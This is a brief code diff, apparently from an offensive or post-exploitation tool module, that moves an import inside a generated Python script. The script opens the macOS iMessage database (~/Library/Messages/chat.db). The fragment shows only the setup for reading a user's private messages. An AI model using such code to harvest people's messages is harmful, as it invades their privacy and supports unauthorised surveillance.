@@ -63,13 +63,13 @@ class Module:
 
     def generate(self):
         script = """
-from os.path import expanduser
 import sqlite3
 import datetime
 import re
 
 def func():
     try:
+        from os.path import expanduser
         home = expanduser("~") + '/Library/Messages/chat.db'
         # Open the database handle for the user
         conn = sqlite3.connect(home)
